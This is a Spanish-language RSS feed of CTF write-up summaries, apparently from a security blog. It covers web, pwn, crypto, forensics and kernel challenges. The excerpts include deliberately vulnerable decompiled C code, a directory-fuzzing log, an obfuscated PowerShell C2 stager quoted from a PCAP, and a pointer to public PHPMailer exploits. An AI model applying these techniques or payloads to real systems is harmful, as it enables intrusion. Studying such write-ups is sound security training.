Mozilla/Firefox/Profiles/2542z9mo.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.info Mozilla/Firefox/Profiles/2542z9mo.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.dll Mozilla/Firefox/Profiles/2542z9mo.</description></item><item><title>Insp3ct0r</title><link>https://7rocky.github.io/ctf/picoctf/web-exploitation/insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/web-exploitation/insp3ct0r/</guid><description>Se nos proporciona una página web como esta:
Como sugiere la página, tenemos que inspeccionar el código HTML de la página web (atajo: Ctrl + U):
Podemos ver un trozo de la flag. Vamos a inspeccionar el archivo CSS (mycss.css):
Genial, tenemos otra pieza. Vamos a echar un vistazo al archivo JS (myjs.js):
Perfecto, podemos juntar todas las piezas y formar la flag: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?f10be399}.</description></item><item><title>Instructive</title><link>https://7rocky.github.io/ctf/imaginaryctf/instructive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/instructive/</guid><description>Se nos proporciona un binario de 64 bits llamado instructive:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Ingeniería inversa Si cargamos el binario en Ghidra, veremos esta función main:
int main() { int ret; undefined flag[136]; char *data; FILE *fp; int j; int i; setbuf(stdout, NULL); setbuf(stdin, NULL); fp = fopen("./flag.txt", "r"); __isoc99_fscanf(fp, "%s", flag); data = (char *) malloc(128); printf("Please enter your username: "</description></item><item><title>Interception</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/interception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/interception/</guid><description>Se nos proporciona el código fuente en Python del servidor. Esto es server.py:
#!/usr/bin/env python3 import signal import random, os from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long from Crypto.Util.Padding import pad, unpad from Crypto.Cipher import AES from pool import GREET, ANS from secret import RESTRICTED class GRAS: def __init__(self, m, p, q): self.m = m self.a = 0xdeadbeef self.p = p self.q = q def generate_key(self): ct = 0x1337 # this loop runs in milliseconds in our super computer for _ in range(self.</description></item><item><title>Intergalactic Post</title><link>https://7rocky.github.io/ctf/htb-challenges/web/intergalactic-post/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/intergalactic-post/</guid><description>Se nos proporciona una aplicación web en PHP con una única funcionalidad, que es poner un email en un formulario.
Empezamos analizando el código fuente. El archivo index.php muestra que solo hay dos rutas (GET y POST):
&amp;lt;?php spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = "controllers/${name}"; } else if (preg_match('/Model$/', $name)) { $name = "models/${name}"; } include_once "${name}.php"; }); $database = new Database('/tmp/challenge.db'); $router = new Router(); $router-&amp;gt;new('GET', '/', 'IndexController@index'); $router-&amp;gt;new('POST', '/subscribe', 'SubsController@store'); die($router-&amp;gt;match()); Vemos que Database.</description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/interstellar-c2/</guid><description>Se nos proporciona un archivo PCAP llamado capture.pcapng. Vamos a verlo en Wireshark:
Como siempre, es bueno comenzar a analizar protocolos de alto nivel como HTTP, así que apliquemos un filtro:
La primera petición se intenta descargar un script de PowerShell llamado vn84.ps1:
Desofuscación de PowerShell Podemos tomar el script de Wireshark y leerlo aquí:
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so') ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ; &amp;amp;("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3 ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte')); .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle') BI34 ( [TyPE]("</description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/</guid><description>Se nos proporciona un archivo PCAP llamado capture.pcapng. Vamos a verlo en Wireshark:
Como siempre, es bueno comenzar a analizar protocolos de alto nivel como HTTP, así que apliquemos un filtro:
La primera petición se intenta descargar un script de PowerShell llamado vn84.ps1:
Desofuscación de PowerShell Podemos tomar el script de Wireshark y leerlo aquí:
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so') ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ; &amp;amp;("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3 ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte')); .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle') BI34 ( [TyPE]("</description></item><item><title>IRCware</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/ircware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/ircware/</guid><description>Tenemos un binario llamado ircware:
$ file ircware ircware: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped Análisis básico Si lo abrimos en Ghidra de inmediato, el código en C descompilado será muy difícil de entender porque el binario está despojado de sus símbolos. En su lugar, podemos intentar ejecutarlo:
$ ./ircware EXCEPTION! ABORT Bueno, nada útil. Con ltrace podemos registrar todas las llamadas a funciones externas:</description></item><item><title>Irish Flan</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/irish-flan/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/irish-flan/</guid><description>Yum, time for dessert.
Challenge contributed by CryptoHack
Challenge files:
output.txt irish_flan.py Se nos proporciona un script en Python que usa cuaterniones para ocultar una clave AES utilizada para cifrar la flag. La implementación de los cuaterniones se basa en clases de Python. Podemos suponer que la implementación es correcta (aunque hay un error en la potencia de un cuaternión, pero no es intencionado).
Análisis del código fuente La parte relevante del script es:</description></item><item><title>Janken</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/janken/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/janken/</guid><description>Se nos proporciona un archivo binario llamado janken y una instancia remota a la que conectarnos:
$ file janken janken: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-linux-x86-64.so.2, BuildID[sha1]=56b54cdae265aa352fe2ebb016f86af831fd58d3, for GNU/Linux 3.2.0, not stripped Se trata de un juego de Piedra-Papel-Tijera:
$ nc 167.99.86.8 31902 ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▌ じ ゃ ん 拳 ▐ ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ 1. ℙ ∟ ₳ Ұ 2. ℜ ℧ ∟ Ӗ ⅀ &amp;gt;&amp;gt; 2 ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▚ [*] Rock is called "</description></item><item><title>Jeeves</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/jeeves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/jeeves/</guid><description>Se nos proporciona un binario de 64 bits llamado jeeves:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Podemos usar Ghidra para analizar el binario y echar un vistazo al código en C descompilado. Este es el main:
int main() { char name[44]; int fd; void *data; uint code; code = 0xdeadc0d3; printf("Hello, good sir!\nMay I have your name? "); gets(name); printf("Hello %s, hope you have a good day!</description></item><item><title>Jenny From The Block</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/jenny-from-the-block/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/jenny-from-the-block/</guid><description>Se nos proporciona este código fuente en Python:
from hashlib import sha256 from Crypto.Util.Padding import pad, unpad import signal import subprocess import socketserver import os allowed_commands = [b'whoami', b'ls', b'cat secret.txt', b'pwd'] BLOCK_SIZE = 32 def encrypt_block(block, secret): enc_block = b'' for i in range(BLOCK_SIZE): val = (block[i]+secret[i]) % 256 enc_block += bytes([val]) return enc_block def encrypt(msg, password): h = sha256(password).digest() if len(msg) % BLOCK_SIZE != 0: msg = pad(msg, BLOCK_SIZE) blocks = [msg[i:i+BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)] ct = b'' for block in blocks: enc_block = encrypt_block(block, h) h = sha256(enc_block + block).</description></item><item><title>Jorge Wants a Token</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/jorge-wants-a-token/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/jorge-wants-a-token/</guid><description>Se nos el código fuente en Python del servidor. Por un lado tenemos administation.py (el archivo principal), y por otro tenemos library.py (funciones auxiliares). El servidor nos da estas opciones:
$ nc 0.cloud.chals.io 15980 __ __ __ ____ / / / /___ ______/ /__/ __ \____ / /_/ / __ `/ ___/ //_/ / / / __ \ / __ / /_/ / /__/ ,&amp;lt; / /_/ / / / / /_/ /_/\__,_/\___/_/|_|\____/_/ /_/ Welcome to the HackOn administration.</description></item><item><title>Juggling facts</title><link>https://7rocky.github.io/ctf/htb-challenges/web/juggling-facts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/juggling-facts/</guid><description>Se nos proporciona la siguiente página web:
Análisis de código estático También nos dan el código PHP de la aplicación web. La parte importante está en controllers/IndexController.php:
&amp;lt;?php class IndexController extends Controller { public function __construct() { parent::__construct(); } public function index($router) { $router-&amp;gt;view('index'); } public function getfacts($router) { $jsondata = json_decode(file_get_contents('php://input'), true); if ( empty($jsondata) || !array_key_exists('type', $jsondata)) { return $router-&amp;gt;jsonify(['message' =&amp;gt; 'Insufficient parameters!']); } if ($jsondata['type'] === 'secrets' &amp;amp;&amp;amp; $_SERVER['REMOTE_ADDR'] !</description></item><item><title>Juggling Facts</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/juggling-facts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/juggling-facts/</guid><description>Se nos proporciona la siguiente página web:
Análisis de código estático También nos dan el código PHP de la aplicación web. La parte importante está en controllers/IndexController.php:
&amp;lt;?php class IndexController extends Controller { public function __construct() { parent::__construct(); } public function index($router) { $router-&amp;gt;view('index'); } public function getfacts($router) { $jsondata = json_decode(file_get_contents('php://input'), true); if ( empty($jsondata) || !array_key_exists('type', $jsondata)) { return $router-&amp;gt;jsonify(['message' =&amp;gt; 'Insufficient parameters!']); } if ($jsondata['type'] === 'secrets' &amp;amp;&amp;amp; $_SERVER['REMOTE_ADDR'] !</description></item><item><title>Keep Tryin'</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/keep-tryin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/keep-tryin/</guid><description>Se nos da un archivo PCAP con algunos de los segmentos TCP, mensajes HTTP y consultas DNS:
Tráfico HTTP En primer lugar, analicemos los mensajes HTTP:
El primero parece inútil, solo muestra TryHarder. Y el segundo tiene una cadena codificada en Base64: S2VlcCB0cnlpbmcsIGJ1ZmZ5Cg==. Pero&amp;hellip;
$ echo S2VlcCB0cnlpbmcsIGJ1ZmZ5Cg== | base64 -d Keep trying, buffy Consultas DNS Estas son las consultas DNS anteriores:
Se ven muy extrañas. De hecho, el primero contiene una cadena codificada en Base64:</description></item><item><title>Kerbab</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/kerbab/</guid><description>Se nos proporciona un sistema de archivos Linux y otros archivos comunes en retos de explotación de kernel:
# ls -lh total 12M -rw-r--r-- 1 root root 618 Feb 25 23:21 Dockerfile -rwxr-xr-x 1 root root 59 Feb 25 23:21 deploy_docker.sh -rw-r--r-- 1 root root 155 Feb 25 23:21 docker-compose.yml -rw-r--r-- 1 root root 2.4M Feb 25 23:21 initramfs.cpio.gz -rw-r--r-- 1 root root 6.2K Feb 25 23:21 kebab.c drwxr-xr-x 7 root root 4.</description></item><item><title>Kernel Adventures: Part 1</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/kernel-adventures-part-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/kernel-adventures-part-1/</guid><description>Se nos proporciona un sistema de archivos Linux y otros archivos comunes en retos de explotación de kernel:
# ls -lh total 12M -rw-r--r-- 1 root root 8,1M dic 11 2019 bzImage -rw-r--r-- 1 root root 84 dic 11 2019 notes.txt -rw-r--r-- 1 root root 3,2M dic 11 2019 rootfs.cpio.gz -rwxr-xr-x 1 root root 262 dic 11 2019 run.sh # cat notes.txt I removed the password hashes in the file I gave you.</description></item><item><title>Kernel searcher</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/kernel-searcher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/kernel-searcher/</guid><description>I have a super secret isogeny. Wanna know where your point ends up? Just send me your favourite coordinates.
Challenge contributed by CryptoHack
Challenge files:
Dockerfile entry.sh kernel_searcher.sage kernel_searcher.xinetd Se nos proporciona un script en SageMath que oculta la flag bajo una isogenia y nos permite evaluar la isogenia en cualquier punto que deseemos.
Análisis del código fuente La parte relevante del script es esta:
import json from Crypto.Util.number import bytes_to_long proof.</description></item><item><title>knote</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/knote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/knote/</guid><description>Se nos proporciona un sistema de archivos Linux y algunos otros archivos comunes en retos de explotación de kernel:
$ tree . ├── debug │ ├── bzImage │ ├── qemu-cmd │ └── rootfs.img ├── knote.c └── knote.ko 1 directory, 5 files Este es debug/qemu-cmd:
#!/bin/bash timeout --foreground 35 qemu-system-x86_64 \ -m 128M \ -nographic \ -kernel /home/ctf/bzImage \ -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \ -monitor /dev/null \ -initrd /home/ctf/rootfs.img \ -no-kvm \ -cpu qemu64 \ -smp cores=2 Básicamente es un comando para ejecutar la imagen del kernel con qemu.</description></item><item><title>Kryptos Support</title><link>https://7rocky.github.io/ctf/htb-challenges/web/kryptos-support/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/kryptos-support/</guid><description>Se nos proporciona esta página web:
Nos permite enviar mensajes que serán revisados por un administrador:
Enumeración Como no tenemos el código fuente, vamos a usar ffuf para descubrir algunas rutas:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://188.166.146.25:32282/FUZZ [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 46ms] * FUZZ: login [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 37ms] * FUZZ: admin [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 39ms] * FUZZ: static [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 41ms] * FUZZ: Login [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 37ms] * FUZZ: logout [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 36ms] * FUZZ: settings [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 39ms] * FUZZ: tickets [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 68ms] * FUZZ: Admin [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 39ms] * FUZZ: Logout [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 39ms] * FUZZ: Static [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 62ms] * FUZZ: Tickets [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 36ms] * FUZZ: SETTINGS [Status: 200, Size: 2067, Words: 934, Lines: 54, Duration: 39ms] * FUZZ: [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %C0 [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 41ms] * FUZZ: LogIn [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 42ms] * FUZZ: LOGIN [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 39ms] * FUZZ: %CF [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %CD [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %CE [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %D8 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %CC [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %CB [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %CA [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %D0 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 38ms] * FUZZ: %D1 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 36ms] * FUZZ: %D7 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %D6 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %D5 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %D4 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 37ms] * FUZZ: %C2 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %C8 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %C9 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %C1 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 48ms] * FUZZ: %D2 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 48ms] * FUZZ: %D3 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 39ms] * FUZZ: %C6 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %C7 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 38ms] * FUZZ: %C4 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %C5 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %C3 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %D9 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 39ms] * FUZZ: %DD [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %DE [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %DF [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %DB Vemos que tenemos una página de inicio de sesión:</description></item><item><title>La casa de papel</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/la-casa-de-papel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/la-casa-de-papel/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Además, disponemos del código fuente en C. El programa es un gestor de notas con un menú bastante típico:
$ ./chall ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡒⠦⠤⠤⠄⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⢼⠀⠀⠒⠒⠤⠤⠤⠤⠤⣀⣀⣀⣀⠀⠀⠘⡇⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢀⣀⠤⠔⠒⠉⠁⢀⣼⡀⠀⢠⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡧⠚⠉⢹⡀⠀⠀⠀⠀⠀⠀ ⠰⣖⠊⠉⠀⠀⠀⣠⠔⠚⠉⠁⢀⡇⠀⡀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⢀⡇⠀⣤⠀⢷⡀⠀⠀⠀⠀⠀ ⠀⠈⠳⡄⠀⠀⠋⣠⠖⠂⡠⠖⢙⡇⠀⠈⠉⠉⠉⠉⠓⠒⠒⠒⠒⠒⠆⠀⠀⣷⡀⠉⢦⠀⢳⡀⠀⠀⠀⠀ ⠀⠀⠀⠈⢦⠀⠀⠁⠀⠀⠀⢀⠼⡇⠀⠀⠦⠤⠤⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠱⡀⠀⠳⡀⠙⣆⠀⠀⠀ ⠀⠀⠀⠀⠀⠳⡄⠀⢀⡤⠊⠁⢠⡇⠀⠠⠤⢤⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⡧⡀⠙⢄⠀⠱⠄⠈⠳⡄⠀ ⠀⠀⠀⠀⠀⠀⠙⡄⠀⠀⡠⠔⢻⠀⠀⠀⠀⠀⠀⠠⣄⣀⣀⣁⣀⠀⠀⠀⠀⡇⠱⡀⠀⠀⠀⠀⠀⣀⣘⣦ ⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⡸⠀⠀⠰⣄⣀⡀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⡇⠀⠃⢀⣠⠴⠛⠉⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠒⠀⠀⠀⠠⡇⣠⠔⠋⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢸⠁⠀⠀⠀⠒⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠢⣄⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣀⠀⠀⠀⠀⠀⠀⠀⠢⠤⣀⠀⠀⠁⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠉⠙⠒⠤⢤⡀⠀⠀⠀⠀⠉⠒⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠶⠒⠊⠉⠉⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⢄⡀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ What would you like to do?</description></item><item><title>Labyrinth</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/labyrinth/</guid><description>Se nos proporciona un binario de 64 bits llamado labyrinth:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Ingeniería inversa Si lo abrimos en Ghidra, veremos esta función main en código C descompilado:
int main() { int ret; char *__s; char data[32]; ulong i; setup(); banner(); data._0_8_ = 0; data._8_8_ = 0; data._16_8_ = 0; data._24_8_ = 0; fwrite("\nSelect door: \n\n"</description></item><item><title>Lazy Ballot</title><link>https://7rocky.github.io/ctf/htb-challenges/web/lazy-ballot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/lazy-ballot/</guid><description>Se nos proporciona un sitio web como este:
También se nos proporciona el código fuente del servidor en Node.js.
Análisis del código fuente Esto es routes/index.js:
const express = require("express"); const router = express.Router({ caseSensitive: true }); const AuthMiddleware = require("../middleware/auth"); let db; const response = (data) =&amp;gt; ({ resp: data }); router.get("/", (req, res) =&amp;gt; { return res.render("index.pug"); }); router.get("/login", async (req, res) =&amp;gt; { if (req.session.authenticated) { return res.</description></item><item><title>Lazy Game Challenge</title><link>https://7rocky.github.io/ctf/ctflearn/binary/lazy-game-challenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/lazy-game-challenge/</guid><description>Se nos proporciona un servicio que consiste en un sistema de apuestas. Tenemos que apostar una cierta cantidad de dinero y luego adivinar un número entre 1 y 10 en menos de 10 intentos. Por ejemplo:
$ nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of !</description></item><item><title>Leet Test</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/leet-test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/leet-test/</guid><description>Se nos proporciona un binario de 64 bits llamado leet_test:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Si lo abrimos en Ghidra, veremos el siguiente código descompilado en C:
uint winner = 0xcafebabe; void main() { long in_FS_OFFSET; uint random; int urandom_fd; int flag_fd; void *flag; char name[280]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); initialize(); urandom_fd = open("/dev/urandom", 0); read(urandom_fd, &amp;amp;random, 4); close(urandom_fd); random = random &amp;amp; 0xffff; while (true) { printf("</description></item><item><title>Lesson</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/lesson/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/lesson/</guid><description>Se nos proporciona un archivo binario llamado main y su código fuente en C:
#include &amp;lt;stdio.h&amp;gt; void under_construction(){ printf("This is under development\n"); } void print_msg(char *user){ char formatter[0x20]; strncpy(formatter, user, 5); for (size_t i = 0; i &amp;lt; 5; i++) formatter[i] = tolower(formatter[i]); printf(strncmp(formatter, "admin", 5) == 0 ? "\nWelcome admin!\n\n" : "\nWelcome user!\n\n"); } int main(int argc, char **argv){ char name[0x20] = {0}; unsigned long x, y; printf("Enter your name: "</description></item><item><title>Letter Dispair</title><link>https://7rocky.github.io/ctf/htb-challenges/web/letter-dispair/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/letter-dispair/</guid><description>Se nos proporciona la siguiente página web:
Muestra un listado de directorio. Si vamos a /mailer.php veremos esta página para enviar correos:
El archivo mailer.zip contiene el código fuente de mailer.php. Es bastante largo como para ponerlo aquí.
La clave está en que utiliza PHPMailer, que es vulnerable a CVE-2016-10033 y CVE-2016-10045. De hecho, existen exploits públicos como el que aparece en www.exploit-db.com.
